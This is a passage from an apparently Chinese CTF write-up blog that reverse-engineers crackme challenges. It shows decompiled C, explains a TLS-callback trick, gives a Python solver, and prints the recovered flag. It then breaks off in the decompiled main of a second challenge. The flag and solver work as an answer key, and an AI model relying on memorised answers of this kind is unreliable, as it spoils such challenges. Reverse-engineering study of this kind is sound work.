class="hljs-number">0</span>; ; ++i )</span><br><span class="line">  {</span><br><span class="line">    v5 = <span class="hljs-built_in">j_strlen</span>(Str);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( i &gt;= v5 )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    v15 += Str[i];</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">38</span>; ++j )</span><br><span class="line">  {</span><br><span class="line">    step2[j] += v15;</span><br><span class="line">    step2[j] ^= dword_41A4DC;</span><br><span class="line">  }</span><br><span class="line">  step2[++j] = <span class="hljs-number">0</span>;</span><br><span class="line">  v6 = <span class="hljs-built_in">sub_4113E3</span>(a1, a3, (<span class="hljs-keyword">int</span>)&amp;savedregs, a4, (<span class="hljs-keyword">int</span>)step2);</span><br><span class="line">  v14 = v7;</span><br><span class="line">  v13 = v6;</span><br><span class="line">  <span class="hljs-built_in">sub_411258</span>((<span class="hljs-keyword">int</span>)&amp;savedregs, (<span class="hljs-keyword">int</span>)dword_41589C);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sub_411235</span>(v8, v14, <span class="hljs-number">1</span>, v13, a1);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>下面的处理就是把key求和赋值给<code>v15</code>，然后将内容中的数组逐项与<code>v15</code>相加然后异或</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">int</span> __usercall sub_415970@&lt;eax&gt;(<span class="hljs-keyword">int</span> a1@&lt;xmm0&gt;, <span class="hljs-keyword">int</span> ebx0@&lt;ebx&gt;, <span class="hljs-keyword">int</span> a3@&lt;edi&gt;, <span class="hljs-keyword">int</span> a4@&lt;esi&gt;, <span class="hljs-keyword">int</span> target)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// STF0_4</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// ST04_4</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// ST00_4</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+DCh] [ebp-84h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// [esp+E8h] [ebp-78h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v13; <span class="hljs-comment">// [esp+E8h] [ebp-78h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v14[<span class="hljs-number">104</span>]; <span class="hljs-comment">// [esp+F4h] [ebp-6Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v15; <span class="hljs-comment">// [esp+15Ch] [ebp-4h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> savedregs; <span class="hljs-comment">// [esp+160h] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">sub_41122B</span>((<span class="hljs-keyword">int</span>)&amp;unk_41C032);</span><br><span class="line">  v12 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    v14[v12] = *(_BYTE *)(target + <span class="hljs-number">4</span> * i);</span><br><span class="line">    v5 = v12 + <span class="hljs-number">1</span>;</span><br><span class="line">    v14[v5++] = *(_BYTE *)(target + <span class="hljs-number">4</span> * i + <span class="hljs-number">36</span>);</span><br><span class="line">    v14[v5++] = *(_BYTE *)(target + <span class="hljs-number">4</span> * i + <span class="hljs-number">72</span>);</span><br><span class="line">    v14[v5] = *(_BYTE *)(target + <span class="hljs-number">4</span> * i + <span class="hljs-number">108</span>);</span><br><span class="line">    v12 = v5 + <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  v14[v12] = *(_BYTE *)(target + <span class="hljs-number">144</span>);</span><br><span class="line">  v13 = v12 + <span class="hljs-number">1</span>;</span><br><span class="line">  v14[v13] = *(_BYTE *)(target + <span class="hljs-number">148</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v13 + <span class="hljs-number">1</span>) &gt;= <span class="hljs-number">0x64</span> )</span><br><span class="line">    <span class="hljs-built_in">sub_411168</span>(ebx0, a3, a4);</span><br><span class="line">  v14[v13 + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  v6 = <span class="hljs-built_in">printf</span>((<span class="hljs-keyword">int</span>)<span class="hljs-string">"\n%s\n"</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v14);</span><br><span class="line">  v8 = v7;</span><br><span class="line">  v9 = v6;</span><br><span class="line">  <span class="hljs-built_in">sub_411258</span>((<span class="hljs-keyword">int</span>)&amp;savedregs, (<span class="hljs-keyword">int</span>)dword_415AF0);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sub_411235</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)&amp;savedregs ^ v15, v8, <span class="hljs-number">1</span>, v9, a1);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>之后就是每9位一组，把得到的字符串重新排序然后输出，但是没有这么轻松，输出的是乱码，因为用来异或的数只有在<code>TLS</code>回调函数里面用到了，如果正常运行的话应该是0，并没有什么意义，所以很显然这题只要调试一下输出的应该就是真正的flag，OD装了<code>hidden</code>忘了关掉，调试了一次发现输出还是乱码，干脆直接算出这个数</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">step1 = <span class="hljs-string">"wangzherongyao"</span></span><br><span class="line">v15 = <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(step1)):</span><br><span class="line">    v15 += <span class="hljs-built_in">ord</span>(step1[i])</span><br><span class="line">final = [<span class="hljs-number">0xFFFFF9A6</span>, <span class="hljs-number">0xFFFFF991</span>, <span class="hljs-number">0xFFFFF9D3</span>, <span class="hljs-number">0xFFFFF9A8</span>, <span class="hljs-number">0xFFFFF9DC</span>, <span class="hljs-number">0xFFFFF9D5</span>, <span class="hljs-number">0xFFFFF9DC</span>, <span class="hljs-number">0xFFFFF9D4</span>, <span class="hljs-number">0xFFFFF9D8</span>,</span><br><span class="line">         <span class="hljs-number">0xFFFFF9A0</span>, <span class="hljs-number">0xFFFFF9D3</span>, <span class="hljs-number">0xFFFFF9A7</span>, <span class="hljs-number">0xFFFFF9A8</span>, <span class="hljs-number">0xFFFFF9D4</span>, <span class="hljs-number">0xFFFFF9DB</span>, <span class="hljs-number">0xFFFFF9A9</span>, <span class="hljs-number">0xFFFFF9D3</span>, <span class="hljs-number">0xFFFFF9A8</span>,</span><br><span class="line">         <span class="hljs-number">0xFFFFF9AB</span>, <span class="hljs-number">0xFFFFF9D3</span>, <span class="hljs-number">0xFFFFF9DA</span>, <span class="hljs-number">0xFFFFF9D6</span>, <span class="hljs-number">0xFFFFF9D4</span>, <span class="hljs-number">0xFFFFF9AB</span>, <span class="hljs-number">0xFFFFF9AB</span>, <span class="hljs-number">0xFFFFF9DB</span>, <span class="hljs-number">0xFFFFF9A9</span>,</span><br><span class="line">         <span class="hljs-number">0xFFFFF9A5</span>, <span class="hljs-number">0xFFFFF9D6</span>, <span class="hljs-number">0xFFFFF9A8</span>, <span class="hljs-number">0xFFFFF9D8</span>, <span class="hljs-number">0xFFFFF9A6</span>, <span class="hljs-number">0xFFFFF9A6</span>, <span class="hljs-number">0xFFFFF9AB</span>, <span class="hljs-number">0xFFFFF9AA</span>, <span class="hljs-number">0xFFFFF9D6</span>,</span><br><span class="line">         <span class="hljs-number">0xFFFFF9D9</span>, <span class="hljs-number">0xFFFFF98F</span>]</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">38</span>):</span><br><span class="line">    final[i] = (final[i] + v15) &amp; <span class="hljs-number">0xff</span></span><br><span class="line">v = final[<span class="hljs-number">0</span>] ^ <span class="hljs-built_in">ord</span>(<span class="hljs-string">'f'</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">38</span>):</span><br><span class="line">    final[i] = final[i] ^ v</span><br><span class="line">flag = <span class="hljs-string">""</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(final[i])</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(final[i + <span class="hljs-number">9</span>])</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(final[i + <span class="hljs-number">9</span> * <span class="hljs-number">2</span>])</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(final[i + <span class="hljs-number">9</span> * <span class="hljs-number">3</span>])</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>(final[<span class="hljs-number">36</span>]) + <span class="hljs-built_in">chr</span>(final[<span class="hljs-number">37</span>])</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"><span class="hljs-comment"># flag{9969e2ddd64088f71af0caa891b4dc63}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="BBBigEqSet"><a href="#BBBigEqSet" class="headerlink" title="BBBigEqSet"></a>BBBigEqSet</h4><p>打开发现函数很大，有很多式子，无脑<code>z3</code>必定跑不出来，下面只截取了一部分</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl __noreturn <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v13; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v14; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v15; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v16; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v17; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v18; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v19; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v20; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v21; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v22; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v23; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v24; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v25; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v26; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v27; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v28; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v29; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v30; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v31; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v32; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v33; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v34; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v35; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v36; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v37; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v38; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v39; <span class="hljs-comment">// 